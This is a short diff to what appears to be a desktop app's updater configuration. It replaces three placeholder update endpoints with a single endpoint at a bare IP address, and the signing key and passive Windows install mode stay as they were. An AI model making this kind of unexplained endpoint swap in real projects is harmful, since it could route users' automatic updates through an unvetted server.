@@ -32,11 +32,7 @@
   "plugins": {
     "updater": {
       "pubkey": "ZFc1MGNuVnpkR1ZrSUdOdmJXMWxiblE2SUcxcGJtbHphV2R1SUhCMVlteHBZeUJyWlhrNklEQXhSVUkxUlVNd1FrTTFOakl4TVRFS1VsZFJVa2xXWVRoM1JqZHlRVmR5UkRZeWJsRlhaU3QzTXpac09GQjJOMFZMVDBKMGJuWjZlV1JaWVdKME0yNVBURzAzVVhGRE5XRUs=",
-      "endpoints": [
-        "https://update.example.invalid/vergen/update.json",
-        "https://mirror.example.invalid/vergen/update.json",
-        "https://releases.example.invalid/vergen/update.json"
-      ],
+      "endpoints": ["https://106.52.87.40/api/v1/client/updater"],
       "windows": {
         "installMode": "passive"
       }
